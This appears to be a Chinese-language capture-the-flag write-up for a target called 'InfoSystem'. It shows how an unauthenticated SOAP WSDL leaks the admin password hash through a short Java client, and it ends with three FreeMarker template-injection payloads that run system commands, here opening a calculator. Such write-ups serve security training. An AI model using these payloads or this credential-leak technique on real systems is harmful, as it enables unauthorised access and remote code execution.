# InfoSystem
首先是对登陆进行抓包，发现发送了两个数据包，一个是登陆前台，一个是登陆后台：

![image-20211124190636777](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211124190636777.png)

![image-20211124190657633](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211124190657633.png)

访问后台路由`/admin/externalLogin`，重定向到`/admin`，是后台的登陆界面：

![image-20211124190720345](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211124190720345.png)



对这个路由进行扫描，发现可以未授权访问的wsdl：

![image-20211124190744942](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211124190744942.png)

其中`loadUserByUsername`可以通过用户名读取密码的哈希值，编写一个soap客户端来尝试读取`admin`：

```java
public class Main {
    public static void main(String[] args) {
        JaxWsDynamicClientFactory factory = JaxWsDynamicClientFactory.newInstance();
        Client client = factory.createClient("http://infosystem:8081/admin/service/UserService?wsdl");
        try {
            Object[] objects = client.invoke("loadUserByUsername", "admin");
            Arrays.stream(objects).forEach(System.out::println);
            client.destroy();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

成功读取：

![image-20211101012301594](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211101012301594.png)

用这个账号和密码登录后台：

![image-20211101012349859](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211101012349859.png)

其中在新闻发布 & 新闻列表中存在`freemarker`的模板注入：

![image-20211101012427785](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211101012427785.png)

![image-20211101012439444](https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20211101012439444.png)


可用payload:
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("open -a Calculator")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}

<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```
